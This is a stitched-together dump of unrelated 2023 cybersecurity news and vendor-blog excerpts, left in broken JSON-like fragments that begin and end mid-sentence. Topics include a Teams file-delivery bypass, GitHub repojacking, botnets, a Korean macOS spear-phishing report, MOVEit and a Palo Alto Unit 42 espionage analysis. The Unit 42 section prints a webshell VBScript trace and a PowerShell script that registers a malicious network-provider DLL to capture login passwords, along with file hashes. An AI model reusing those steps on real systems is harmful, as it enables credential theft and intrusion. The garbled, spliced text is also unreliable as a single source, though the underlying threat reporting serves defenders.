guidance, the most important information is what they aren't saying,\" he says. \"They took the time and effort to develop this tool, declassify it, and release it. They will never say why, but the reason was worth a significant diversion from how they usually operate by saying nothing.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " \"This vulnerability affects every organization using Teams in the default configuration,\" Corbridge wrote in the post. \"As such it has huge potential reach and could be leveraged by threat actors to bypass many traditional payload delivery security controls.\"Though Teams is typically used for communication between employees within the same organization, Microsoft's default configuration for teams allows users from outside the company to reach out to its employees, the researchers said. This is where the opportunity arises for threat actors to exploit the app to deliver malware, they said.This can be done by bypassing client-side security controls that prevent external tenants from sending files —which in this case, would be malicious — to internal users, the researchers explained.\"Users from one tenancy are able to send messages to users in another tenancy,\" Corbridge explained. \"When doing so, an 'External' banner appears alongside the name.\"Though some employees might not click on a message from an external source, many would, something that Corbridge said the researchers already proved as part of a red-team engagement aimed at gaining an initial foothold in a client's environment.\"This is especially true if the malicious party is impersonating a known member of your organization and has purchased and registered a brand-impersonation domain, as red teams often do,\" he noted in the post.Though external tenants in Teams are blocked from sending files to staff in another organization — unlike their ability to send files between employees in a single organization or tenancy — Corbridge said he and JUMPSEC's head of offensive security Tom Ellson were able to bypass this control within 10 minutes.\"Exploitation of the vulnerability was straightforward using a traditional IDOR technique of switching the internal and external recipient ID on the POST request,\" Corbridge explained in the post. \"When sending the payload like this, it is actually hosted on a SharePoint domain and the target downloads it from there. It appears, however, in the target inbox as a file, not a link.\"The researchers tested their technique in a mature client environment during a red-team exercise last month and confirmed that it \"allowed for a much more simple, reliable, and user-friendly payload delivery avenue than traditional phishing journeys,\" he wrote.The bug provides a \"potentially lucrative avenue\" for threat actors because of how straightforward it is for them to deliver malware to organizations without the need to craft socially-engineered email messages with malicious links or files and hope employees take the bait and click on them, Corbridge wrote.By exploiting the flaw, a malicious payload is served via a trusted Sharepoint domain as a file in a target's Teams inbox. \"As such, the payload inherits the trust reputation of Sharepoint, not a malicious phishing website,\" Corbridge wrote.The researchers reported the vulnerability to Microsoft, which validated its legitimacy but said \"it did not meet the bar for immediate servicing,\" Corbridge wrote.To mitigate the bug themselves, organizations can review if there is a business requirement for external tenants to have permission to message staff and, if this is not the case, to remove the option to do so in Microsoft Teams Admin Center > External Access.If an organization does require communication with external tenants but has only a handful of organizations with which employees regularly communicate, administrators can also use this field to change the Team security settings to only allow communication with certain allow-listed domains, the researchers said.If neither of these mitigation options is viable for an organization, administrators can try educating staff on the possibility of productivity apps such as Teams, Slack, Sharepoint, and others for launching social-engineering campaigns similar to the ones found in email messages to help them avoid compromise.Organizations can also use Web proxy logs to provide alerts or at least baseline visibility into staff members accepting external-message requests, Corbridge added.\"The difficulty, at present, is turning this into a useful piece of telemetry with usernames, and the message in question,\" but can provide some idea of how common this transaction is within an organization for potential mitigation, he acknowledged.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " The issue has to do with how GitHub handles dependencies when a GitHub user or organization changes the name of a project or transfers its ownership to another entity, researchers at Aqua Security said in a report this week.To avoid breaking code dependencies, GitHub creates a link between the original repo name and the new one so all projects that are dependent on the original repo get automatically redirected to the newly renamed one. However, if an organization fails to adequately protect the old username, an attacker could simply reuse it to create a trojanized version of the original repository so that any projects that relied on the repo will once again start downloading dependencies from it.Researchers at Aqua recently decided to investigate the prevalence of repositories on GitHub that are vulnerable to such repojacking, or dependency repository hijacking, as some security researchers refer to the threat.What Aqua discovered was twofold: millions of such repositories — including those belonging to companies such as Google and Lyft — are present on GitHub; and tools are easily available to attackers to find these repos and hijack them. One of these tools is GHTorrent, a project that maintains a nearly complete record of all public events, such as commits and pull requests, on GitHub. Attackers can use GHTorrent to harvest the GitHub names of repositories that organization previously used. They can then register the repo under that old username, recreate the repository, and deliver malware to any project that uses it.Any project that directly references a GitHub repository is vulnerable if the owner of the repository changes or deletes the username for their repository.\"We have presented a significant dataset that attackers can utilize to harvest the names of previous repositories belonging to organizations,\" says Yakir Kadkoda, security researcher at Aqua Nautilus.\"Organizations should not assume that their old organization names will remain undisclosed,\" warns Kadkoda. \"It is crucial for them to claim and keep their old usernames on GitHub and scan GitHub URLs and references in their code to identify any repositories that could potentially be claimed by an attacker.\"Organizations can mitigate their exposure to the repojacking threat by scanning their code, repositories, and dependencies for GitHub links, Kadkoda says: \"They should check if those links directly refer to GitHub projects or if there are redirects pointing to repositories under other usernames or repo names than the original links.\" In these instances, organizations should attempt to claim the available username to prevent attackers from doing so. \"Additionally, organizations should always maintain their old usernames on GitHub,\" he says.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

They could also tamper with the feeding schedules, potentially endangering the pet’s health and adding an extra financial and emotional burden on the owner.The second vulnerability is related to an insecure firmware update process. This could lead to unauthorized code execution, modification of device settings and the theft of sensitive information, including live video feeds sent to the cloud server.“As our lives become more entwined with smart devices, attackers are seizing the opportunity to exploit the weakest links in our interconnected ecosystem,” commented Roland Saco, a security expert at Kaspersky.According to the cybersecurity professional, organizations must acknowledge the potential hazards of smart devices and remain consistently vigilant.“By staying informed, practicing good cybersecurity hygiene, and fostering a collective responsibility for security, we can thwart the advances of attackers and preserve the integrity of our interconnected world,” Saco added.Kaspersky did not mention the pet feeder manufacturer for security reasons but said it promptly reported the vulnerabilities to them, emphasizing the importance of keeping all smart devices updated with the latest firmware and software patches.More generally, users are advised to research manufacturers’ security reputations, review app permissions and consider deploying reliable security solutions to safeguard their smart home ecosystems."

It supports port scanning, UDP, TCP, and HTTP flood attacks and can also set up a reverse shell.The other DDoS botnet malware seen in these attacks is Tsunami, which also uses the IRC protocol for communication.The particular version seen by ASEC is \"Ziggy,\" a Kaiten variant. Tsunami persists between reboots by writing itself on \"/etc/rc.local\" and uses typical system process names to hide.Besides SYN, ACK, UDP, and random flood DDoS attacks, Tsunami also supports an extensive set of remote control commands, including shell command execution, reverse shells, collecting system information, updating itself, and downloading additional payloads from an external source.Next are the MIG Logcleaner v2.0 and Shadow Log Cleaner, both tools used for wiping the evidence of intrusion on compromised computers, making it less likely for victims to realize the infection quickly.These tools support specific command arguments that enable the operators to delete logs, modify existing logs, or add new logs to the system.The privilege escalation malware used in these attacks is an ELF (Executable and Linkable Format) file that raises the attacker's privileges to that of a root user.Finally, the threat actors activate an XMRig coin miner to hijack the server's computational resources to mine Monero on a specified pool.To defend against these attacks, Linux users should use strong account passwords or, for better security, require SSH keys to log in to the SSH server.Additionally, disable root login through SSH, limit the range of IP addresses permitted to access the server, and change the default SSH port to something atypical that automated bots and infection scripts will miss."

At the same time, it also stops older versions of itself.Because Condi doesn't have a persistence mechanism to survive between device reboots, its authors decided to equip it with a wiper for the following files, which prevents the devices from being shut down or restarted:For propagation to vulnerable TP-Link routers, the malware scans for public IPs with open ports 80 or 8080 and sends a hardcoded exploitation request to download and execute a remote shell script that infects the new device.Fortinet mentions that while the samples it analyzed contained a scanner for CVE-2023-1389, it has also observed other Condi samples using different flaws to propagate, so its authors or operators could be experimenting on that front.Additionally, the analysts found samples that use a shell script with an ADB (Android Debug Bridge) source, potentially indicating that the botnet is spread through devices with an open ADB port (TCP/5555).Presumably, this is the direct result of multiple threat actors having bought Condi's source code, adjusting its attacks as they see fit.Regarding Condi's DDoS attack capabilities, the malware supports various TCP and UDP flood methods similar to those of Mirai.Older samples also contain HTTP attack methods; however, these appear to have been stripped in the latest malware version.Signs of an infected TP-Link router include device overheating, network disruptions, inexplicable changes in a device's network settings, and admin user password resets."

More often than not, hackers profit off of this kind of bounty not just by utilizing it themselves, but by reselling it on the Dark Web. For example, online marketplaces regularly traffic in logs that contain victims' account credentials for popular applications.In the entire sample size, less than 5,000 infected devices were traced to North America. A plurality originated in the Asia-Pacific, with the biggest offenders being India (12,632) and Pakistan (9,217). Other countries with many exposed ChatGPT credentials included Brazil (6,531), Vietnam (4,771), and Egypt (4,558).Last December — the first month ChatGPT was made available to the public — the researchers tracked 2,766 Dark Web stealer logs containing compromised accounts. That number surpassed 11,000 the following month and doubled two months after that. By May, the figure was up to 26,802.In other words, the trendline is clearly only moving in one direction.But ChatGPT credentials are almost beside the point, says Mike Parkin, senior technical engineer at Vulcan Cyber. \"Infostealers can be an issue, at least in part, because they're not as outwardly destructive as, say, ransomware, which is hard to miss. A well obfuscated infostealer can be much harder to detect, precisely because it doesn't make itself known.\"Because organizations can more easily miss infostealers than certain other kinds of malware, they're liable to realize their sensitive data is gone only after it's too late.\"Depending on the strain of information stealer, hackers can be gathering everything from application and Web credentials to personal information, stored files, and system configurations. Organizations that have these malware infections in their environment could face having intellectual property, company financials, and pretty much any other data that lands on infected systems exposed,\" Parkin says.As long as infostealers continue to run rampant, ChatGPT credentials will be the least of anybody's worries. \"The real question,\" Parkin asks, \"is what kind of data isn't being leaked by these kinds of malware?\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

GSC는 APT(지능형지속위협) 그룹의 위협활동을 면밀히 추적 관찰하고 있습니다. 초기 정찰 단계부터 내부 침투, 민감 정보에 대한 무단 액세스 권한 탈취까지 각 캠페인에 대한 종합적인 분석과 위험도 평가, Genian EDR 대응 검증까지 병행하고 있습니다.○ 본 건은 한국내 북한인권 및 대북분야에 종사 중인 특정인물을 겨냥해 두단계에 걸쳐 진행된 치밀한 APT 공격으로 검증됐으며, macOS 이용자를 겨냥한 흥미로운 위협 케이스로 그동안 외부에는 잘 알려지지 않은 채 수행되던 은밀한 작전으로 판단됩니다.○ 우선 피해 대상자의 이메일 비밀번호 탈취를 위한 전형적인 1차 피싱 공격과 정찰활동을 수행한 후, 이 과정에서 확인된 웹 브라우저 및 운영체제 정보를 활용해 macOS 기반 악성파일 공격을 수행했습니다. 공격을 받은 대상자는 복수로 확인됐으며, 주로 맥북을 사용 중인 것으로 확인됩니다.○ macOS 기반의 스피어 피싱 공격 사례는 윈도(Windows)에 비해 상대적으로 매우 드문 편이고, 애플 디스크 이미지(Apple Disk Image / DMG) 포맷이나 인스톨러 패키지(Installer Package / PKG) 유형을 첨부파일로 보낼 경우 이메일 수신자가 의심할 가능성이 높은 편이라 상대적으로 안전하다고 인식돼 왔습니다.○ 그러나 한국에서 발견된 실제 사례를 통해 macOS 이용자들도 스피어 피싱 공격에 따른 위험 노출도가 상당히 높아짐에 주목할 필요가 있고, 이는 국내 APT 공격 동향에 시사하는 바가 크다 말할 수 있습니다. 참고로 이번 케이스는 분석된 사례 중 하나일 뿐이며, 아직 확인되지 않은 공격까지 더한다면 이보다 많을 것으로 예측됩니다.○ 이러한 위협 변화는 보다 능동적이고 공세적인 대응방법을 필요로 합니다. Genian EDR3 macOS용 에이전트를 통해 조기에 이상행위를 탐지하고 빠르게 대응 정책을 수립할 수 있습니다. 이는 내부 네트워크로 신규 위협이 확산되기 전 차단하는데 매우 유용하고 효과적인 방안입니다.○ 과거 대표적인 사례의 macOS 기반 공격 전술은 비트코인 거래 서비스처럼 위장한 전용 솔루션이나 불법 소프트웨어 자료실로 유통된 광고성 또는 정보수집 스타일이 보고된 바 있습니다. 더불어 MS Word 문서에 악성 매크로를 삽입해 실행을 유도한 방식이 발견된 바 있습니다.○ 본 사례의 경우 이메일 본문 내 macOS용 악성이 포함된 압축(ZIP) 파일 다운로드 링크를 연결해 클릭을 유도하는 전형적인 스피어 피싱 공격 전술이 사용됐습니다. macOS 기반 맞춤형 스피어 피싱 공격이 한국에서 발견된 건 매우 보기 드문 일입니다.○ 위협 행위자는 MS 원드라이브(OneDrive) API로 설정한 다운로드 링크나 특정 스마트폰 서비스처럼 위장한 허위 도메인을 사용했고, 추적 및 분석 방해를 위해 선택적 링크 비활성화 및 침투 흔적을 제거하기 위한 분석 방해 전략을 구사했습니다.○ ZIP 파일 내부에 정상 사진(.jpg) 파일 5개를 함께 동봉해 미끼로 사용했으며, (.dmg)나 (.pkg) 유형에 따로 패키지화 하지 않고, 바로 애플리케이션 파일(.app)로 유포한 전략을 구사했습니다. 더불어 리소스내 앱아이콘(AppIcon.icns) 설정을 통해 HWP 한글 문서처럼 보이게 구성하고, 내부 리소스에 포함한 정상 HWP 문서를 띄워 이용자를 현혹하는 교란 전술을 적용했습니다.○ 주요 공격 메커니즘은 단계별로 진행이 됩니다. 침해 사고 조사와 분석을 회피하기 위한 절차로 명령제어(C2) 서버에서 핵심 악성 명령을 단계적으로 호출하고, 악성 애플스크립트 명령을 통해 컴퓨터 정보를 수집하는 사이버 정찰 활동을 수행합니다.○ C2 서버의 수동적 명령에 따라 선택적 악성파일이 설치되도록 프로세스를 설계했으며, 이에 따라 최종 공격 전략을 파악하는데 다소 어려움이 존재합니다. 이 글 공유하기"

      "text": " Reporter, Infosecurity MagazineThe use of connected devices in healthcare is driving innovation, offering new ways to assist medical staff. However, the adoption of the Internet of Things (IoT) has expanded the attack surface IT decision-makers in the healthcare industry have to deal with.While 35% of NHS Trusts stated having an automated system to track all connected assets and 59% said they update information on all assets as changes occur, there are still many blind spots regarding IoT.For instance, one-third of surveyed Trusts admitted having no method of tracking IoT devices and 10% said they use manual processes or spreadsheets to do so.Additionally, 15% of Trusts acknowledged they are not tracking connected medical devices (IoMT) and one in five stated they use manual processes or spreadsheets to track these assets.A further 19% of respondents recognize that information on connected medical devices in their inventory system is either not updated at all or only updated annually.The main reason for this visibility shortage is a lack of resources, with 38% of Trusts’ IT decision-makers admitting that they do not have sufficient staff to meet the demands placed upon them and 23% that they do not have enough resources to deal with replacing legacy or unsupported medical devices.These technology gaps make it difficult for NHS Trusts to compile evidence when carrying out Data Security Protection Toolkit (DSPT) assessments or remediate cybersecurity issues within the mandated two weeks, respondents told Armis.It could have significant consequences, not only in regulatory compliance but also open the door to more cybersecurity incidents and even safety failures, Mohammad Waqas, principal solutions architect at Armis, said in a public statement: “Real-time insights on everything connected in a Trust’s environment, even third-party assets, are key to establishing a resilient security strategy and proactively reducing the attack surface. […] Specifically for connected medical devices (IoMT), which are hard to keep updated, being able to monitor them and understand their behavior and risk in real-time is key to ensure safety and comply with the latest regulations.”“To fill in those gaps and improve the operational effectiveness of NHS Trusts, allowing staff to focus on core functions and enabling insights on threat intelligence and clinical device utilization, the right technology partners need to be brought in to solve multiple use cases and bridge technology gaps,” he added.Results from the Armis report came from a Freedom of Information (FOI) request to UK NHS Trusts."

      "text": " UK / EMEA News Reporter, Infosecurity MagazineSecurity researchers have discovered 2.2 million breached credentials linked to the UK’s 100 top universities available on the dark web, putting staff, students and their data at risk.Crossword Cybersecurity’s Trillion risk monitoring service found the credentials, over half (54%) of which it claimed belong to elite Russel Group institutions.That makes the size of the discovery potentially significant, although there’s no information on how many of the affected individuals are still at university.“We recognize that these environments are amongst the most uniquely challenging to protect with overlapping requirements for secrecy and openness, so many attack paths need to be factored in. We believe that cybersecurity practices for all organizations, not just the education sector should include the proactive monitoring for stolen credentials, and a requirement for multi-factor authentication.”Theoretically, threat actors may not just be looking for university credentials with an eye on unpublished research. They may be hoping to steal sensitive personally identifiable information (PII) from staff and students and/or to attempt phishing or identity fraud.The report found that the top 30 universities in the country are up to 50% more likely to have breached credentials than other institutions in the top 100, and that London’s universities have more breached logins (506,330) than those in Scotland, Wales and Northern Ireland combined (465,767)."

      "text": " NSO Group is facing a number of existential crises at the moment, and it appears there's a group of enterprising investors — including, reportedly, a Wrigley chewing gum magnate — ready to take advantage, lassoing control of arguably the most destructive and powerful spyware tool known to-date, i.e., Pegasus.There's also the problem of the mounting number of lawsuits.The report adds a spokesperson for Wrigley denied he is in discussions to buy NSO Group assets, while a source close to Simonds said he was \"deep\" in talks about a sale but aware it would be a steep climb to get the deal done. \"Placing such powerful surveillance technology in the hands of individuals who may not have deep expertise in the cyber industry or a history of involvement in the sector raises questions about the potential ramifications,\" Callie Guenther, cyber threat research manager with Critical Start tells Dark Reading about the potential NSO sell-off. \"It is essential to ensure that any potential acquirer of NSO's assets possesses the necessary expertise to handle the technology responsibly, maintain appropriate safeguards, and prevent potential misuse.\"It should be noted that other attempts at buying control of Pegasus haven't worked out. Last year L3Harris, an American company and US defense contractor was looking into a possible purchase of NSO Group's technology, but the White House objected over \"serious counter-intelligence and security concerns,\" the Guardian added.Then there is the Israeli government, which closely regulates NSO Group and could potentially intervene in any sell off of its technology, the Guardian points out.\"NSO operates under close regulation by Israel's Ministry of Defense, and any potential sale of its assets would likely face scrutiny from Israeli authorities,\" Guenther says. \"It remains to be seen how such a transaction could proceed and whether it would comply with relevant regulatory requirements and national security considerations.\"Perhaps there's a pot-sweetener here though: The Guardian added a juicy rumor to its reporting that Simonds has privately pledged to hand over the surveillance technology to the so called \"Five Eyes\" alliance between the intelligence agencies of Australia, Canada, New Zealand, the UK, and the US.Even so, a pledge is not a guarantee. Guenther outlines a number of potential problems with NSO Group's assets falling into the wrong hands, including giving the new owners the power to improve upon its existing capabilities for exploitation, targeting, as well as slow down future potential vulnerability disclosures.\"The acquisition could impact the overall cyber threat landscape. If NSO's spyware technology becomes more accessible or proliferates in unauthorized hands, it could lead to an increase in targeted attacks, surveillance activities, and potential abuse,\" Guenther warns. \"This would necessitate heightened vigilance and strengthened defensive measures from organizations, governments, and cybersecurity communities to mitigate the associated risks.\"Many may question the power a tool like Pegasus could have when flying on behalf of someone rich enough to buy it, but the true value of NSO Group, and its dominance in the spyware space, might have already peaked.JT Keating, senior vice president of mobile security firm Zimperium, explained to Dark Reading that the trend is decidedly moving toward open source spyware, making the surveillance tools available to almost anyone and driving down the value of NSOs proprietary Pegasus product.\"Spyware is now mainstream, including the shift from sole reliance on the Dark Web for distribution to seeing the same kits and tools being found on online repositories like GitHub or online communities like Reddit,\" Keating says. \"Regardless of what happens to organizations like NSO, mobile spyware will only continue to proliferate.\"Meanwhile though, the squeeze on NSO Group's business continues.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " Three Android apps on Google Play were used by state-sponsored threat actors to collect intelligence from targeted devices, such as location data and contact lists.The apps used in DoNot's latest campaign perform basic information gathering to prepare the ground for more dangerous malware infections, representing what appears to be the first stage of the threat group's attacks.The suspicious applications found by Cyfirma on Google Play are nSure Chat and iKHfaa VPN, both uploaded from 'SecurITY Industry.'Both apps and a third from the same publisher, which does not appear malicious according to Cyfirma, remain available on Google Play.The download count is low for all SecurITY Industry's apps, indicating they are used selectively against specific targets.The two apps request risky permissions during installation, such as access to the user's contact list (READ_CONTACTS) and precise location data (ACCESS_FINE_LOCATION), to exfiltrate this information to the threat actor.Note that to access the target's location, GPS needs to be active, otherwise, the app fetches the last known device location.The collected data is stored locally using Android's ROOM library and later sent to the attacker's C2 server via an HTTP request.The C2 for the VPN app is \"https[:]ikhfaavpn[.]com.\" In the case of nSure Chat, the observed server address was seen last year in Cobalt Strike operations.Cyfirma's analysts have found that the code base of the hackers' VPN app was taken directly from the legitimate Liberty VPN product.Cyfirma's attribution of the campaign to the DoNot threat group is based on the specific use of encrypted strings utilizing the AES/CBC/PKCS5PADDING algorithm and Proguard obfuscation, both techniques associated with the Indian hackers.Moreover, there are some unlikely coincidences in the naming of certain files generated by the malicious apps, linking them to past DoNot campaings.Direct messages on these apps direct victims to the Google Play store, a trusted platform that lends legitimacy to the attack, so they can be easily tricked into downloading suggested apps.As for the targets of DoNot's latest campaign, little is known about them besides that they are based in Pakistan.Update 6/24 - A Google spokesperson has sent BleepingComputer the following comment:These apps have been removed from Google Play and the developer has been banned."

      "text": " The Cortex Threat Research team has recently identified multiple espionage attacks targeting governmental entities in the Middle East and Africa. According to our findings, the main goal of the attacks was to obtain highly confidential and sensitive information, specifically related to politicians, military activities, and ministries of foreign affairs.The attacks, which happened around the same time frame, shared several very unique similarities in tactics, techniques, and procedures (TTPs), with some of them never reported before in the wild, while other techniques are relatively rare, with just a handful of attackers reported using them.We currently track the activity group behind the attacks as CL-STA-0043. This activity group’s level of sophistication, adaptiveness, and victimology suggest a highly capable APT threat actor, and it is suspected to be a nation-state threat actor.While tracking and analyzing CL-STA-0043, we discovered new evasive techniques and tools used by the attackers, such as an in-memory VBS implant to run webshell clandestinely, as well as a rare credential theft technique first seen in the wild.Perhaps one of the most interesting findings of this investigation is the rare and novel Exchange email exfiltration technique that was used by the attackers only on a few selected targets, according to our telemetry.In this blog post, we will provide information regarding the various TTPs observed in the attacks, including the execution as shown through the lens of the Palo Alto Networks Cortex XDR product.  In most cases, the main post exploitation method observed in such attacks is to deploy various kinds of webshell, which provide the attackers access to the compromised network via a remote shell.  Below is a snippet of the in-memory VBscript:\"request.Item(\"\"<redacted>\"\");IStringList.Item();IServer.ScriptTimeout(\"\"3600\"\");IServer.CreateObject(\"\"Scripting.Dictionary\"\");IRequest.Form(\"\"key\"\");IStringList.Item();ISessionObject.Value(\"\"payload\"\");IXMLDOMNode._00000029(\"\"base64\"\");IXMLDOMElement.dataType(\"\"bin.base64\"\");IXMLDOMElement.text(\"\"<redacted>\"\");IXMLDOMElement.nodeTypedValue();ISessionObject.Value(\"\"payload\"\");IDictionary.Add(\"\"payload\"\", \"\"Set Parameters=Server.CreateObject(\"\"Scripting.Dictionary\"\")Function Base64Encode(sText)Dim oXML, oNodei\"\");IDictionary.Item(\"\"payload\"\");IServer.CreateObject(\"\"Scripting.Dictionary\"\");_Stream.Charset(\"\"iso-8859-1\"\");_Stream.Type(\"\"1\"\");_Stream.Open();_Stream.Write(\"\"Unsupported parameter type 00002011\"\");<snipped code>_Stream.ReadText();IServer.CreateObject(\"\"WScript.shell\"\");IWshShell3._00000000();IWshShell3.Exec(\"\"cmd /c \"\"cd /d \"\"C:/<redacted>/\"\"&ipconfig /all\"\" 2>&1\"\");\" Once the attackers had penetrated the network, they performed reconnaissance activity, mapping out the network and identifying critical assets. The attackers were mainly focused on finding administrative accounts and identifying important servers, such as:To get this information, the attackers tried to execute the following tools: In order to carry out the attacks successfully, the threat actors needed to run their tools and commands with adequate privileges (admin/system). To do so, they made use of different tools from the trending Potato suite. The Potato suite is a collection of various native Windows privilege escalation tools. The main tools that were observed during the investigation were:Using those tools, the threat actor attempted to create administrative accounts, and to run various tools that require elevated privileges. The Windows operating system contains accessibility features that may be launched with a key combination before a user has logged in to the system, or by an unprivileged user. An attacker can modify the way these programs are launched to get a command prompt or a backdoor.There were multiple observed attempts to edit the registry key for sethc.exe to point to cmd.exe and subsequently run the sethc.exe file with the parameter “211”. This turns on the system’s “Sticky Keys” feature which in return executes the elevated command prompt shell. In addition, the attackers used a privilege escalation tool “Iislpe.exe”, which is an IIS privilege escalation tool, written by “k8gege”, the same author who created the aforementioned Ladon tool. Using this method, the attackers executed a PowerShell script that registered a new network provider, named “ntos”, set to execute a malicious DLL, ntos.dll, dropped by the attacker in the C:\\Windows\\system32 folder.$path = Get-ItemProperty -Path \"\"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\"\" -Name PROVIDERORDER$UpdatedValue = $Path.PROVIDERORDER + \"\",ntos\"\"Set-ItemProperty -Path $Path.PSPath -Name \"\"PROVIDERORDER\"\" -Value $UpdatedValueNew-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\ntosNew-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\ntos\\NetworkProviderNew-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\ntos\\NetworkProvider -Name \"\"Class\"\" -Value 2New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\ntos\\NetworkProvider -Name \"\"Name\"\" -Value ntosNew-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\ntos\\NetworkProvider -Name \"\"ProviderPath\"\" -PropertyType ExpandString -Value \"\"%SystemRoot%\\System32\\ntos.dll\"\" As part of the login activity, Winlogon.exe captures the user and password and forwards them to mpnotify.exe, which loads the malicious DLL and shares the cleartext passwords with it. The malicious DLL then creates a new file, containing the stolen credentials. This file is then sent to the command and control server (C2) of the attackers.  In addition, Yasso has powerful SQL penetration functions, and it provides a range of database functionalities for the operator to perform remote actions. The following Yasso modules were most in use during the attacks:The use of the different Yasso modules were detected in the Cortex XDR & XSIAM product, as shown in Figure 7.  Besides the use of Yasso for lateral movement, the attackers were also observed using other common and known techniques to accomplish that. To gather those emails, two very unique methods were observed:  In the first method, we observed the abuse of the Exchange Management Shell (exshell.psc1) to run a command that saved all emails from users that contain the string “foreign” and all emails sent from or to governmental accounts, into csv files.   In addition to the command lines above, other searches for specific content (using the filter “($_.MessageSubject -like '*<redacted>*')”) were observed as well. Those searches were for very specific individuals and information related to highly sensitive stately and foreign policy matters.Below is a snippet of the script which originally contained over 30 targeted mailboxes of individuals, embassies, military-related organizations, and others.  The output of those scripts were saved into .tiff files, under “c:\\users\\public\\<redacted>”, which were later compressed, password-protected and sent to the attacker’s C2 server as well.  In this blog, we uncovered several previously unreported and rare techniques and tools observed used by a cluster of activity we refer to as CL-STA-0043. While the research is still ongoing, and the full identity of the threat actor/s is still being studied, we believe that the level of sophistication, determination and espionage motives demonstrated in this report, bear the hallmarks of a true advanced persistent threat, potentially operating on behalf of nation-state interests. In the same vein, this sheds light on how threat actors seek to obtain non-public and confidential information about geopolitical related topics and high-ranking public service individuals. During the attacks, Cortex XDR & XSIAM raised many alerts for the malicious activities observed in CL-STA-0043. Prevention and detection alerts were raised for each phase of the attack: the initial access attempts, the use of rare tools and the advanced technique, and for the data exfiltration attempts.  For Palo Alto Networks customers, our products and services provide the following coverage associated with this group:It also offers the following protections related to the attacks discussed in this post:North America Toll-Free: 866.486.4842 (866.4.UNIT42)EMEA: +31.20.299.3130APAC: +65.6983.8730Japan: +81.50.1790.0200 Yasso6b37aec6253c336188d9c8035e90818a139e3425c6e590734f309bd45021f980Credential Dumping Tool (sam.exe)77a3fa80621af4e1286b9dd07edaa37c139ca6c18e5695bc9b2c644a808f9d60iislpe.exe73b9cf0e64be1c05a70a9f98b0de4925e62160e557f72c75c67c1b8922799fc4SMBexecE781ce2d795c5dd6b0a5b849a414f5bd05bb99785f2ebf36edb70399205817eenbtscan0f22e178a1e1d865fc31eb5465afbb746843b223bfa0ed1f112a02ccb6ce3f41Ladon291bc4421382d51e9ee42a16378092622f8eda32bf6b912c9a2ce5d962bcd8f4aa99ae823a3e4c65969c1c3aa316218f5829544e4a433a4bab9f21df11d16154ddcf878749611bc8b867e99d27f0bb8162169a8596a0b2676aa399f0f12bcbd7ntos.dllbcd2bdea2bfecd09e258b8777e3825c4a1d98af220e7b045ee7b6c30bf19d6df  Copyright © 2023 Palo Alto Networks.

      "text": " A third vulnerability affecting the popular MOVEit file transfer tool is causing alarm among U.S. officials and cybersecurity researchers after it was revealed that several government agencies were affected by a hack exploiting the first bug.Progress Software, the company behind MOVEit, told Recorded Future News that an “independent source” disclosed the new vulnerability.“At this time, we have not seen indications that this new vulnerability has been exploited. We have developed a patch to address this issue and are communicating with customers on the steps they need to take to further harden their environments,” a MOVEit spokesperson said, adding that they have been coordinating with federal law enforcement and other agencies.In its advisory, Progress warned that it is “extremely important” that all MOVEit customers take immediate action to address the issue.They discovered that the latest patch would still be vulnerable to other attack methods, leading to them finding a third zero-day vulnerability.Hammond explained that the attack method Clop ransomware hackers used involved three separate steps, but the newest vulnerability allowed them to shorten the attack to just two.“The best recommendation to users is to continue to patch, and Progress advises shutting off the HTTP component entirely,” he said.He noted that the MOVEit Transfer application can be attacked in multiple ways, so the fact that more issues are being discovered is “unsurprising.”“While more and more security researchers scrutinize this software to find more bugs, we might continue to see more bypass techniques. Progress is aware and we are working closely together for them to help modernize and secure this legacy code base,” he added.A spokesperson for the Department of Agriculture told Recorded Future News on Friday that it may have been hit by Clop, which has posted batches of victims over the last week but claimed to have deleted all government-related data. The USDA's breach investigation has not been previously reported.\"USDA is aware of a possible data breach with a vendor that may impact a very small number of employees, and any employees whose data may have been affected will be contacted and provided support,” the spokesperson said.Spokespeople for the Department of Labor, Education and Interior said they were not affected, while both the State Department and Defense Department declined to comment. Several other agencies did not respond to requests for comment.House Energy and Commerce Chair Cathy McMorris Rodgers (R-WA) and Committee Ranking Member Frank Pallone (D-N.J.) have asked for a briefing about the issue from the White House and the Department of Energy.This week, motor vehicle departments in both Oregon and Louisiana confirmed that they were also affected by the attacks.“Our analysis identified multiple files shared via MOVEit Transfer that were accessed by unauthorized actors before we received the security alert,” the department said.“We do not have the ability to identify if any specific individual’s data has been breached. Individuals who have an active Oregon ID or driver’s license should assume information related to that ID is part of this breach.”Emsisoft ransomware expert Brett Callow said there are now 63 victims who have either been named by Clop or have come forward to announce breaches.“While we don’t yet know how many organizations have been affected or who those organizations are, this may well turn out to be one of the most wide-ranging and significant breaches of recent years,” he said.“Companies that provide credit monitoring services are likely rubbing their hands together in gleeful anticipation.

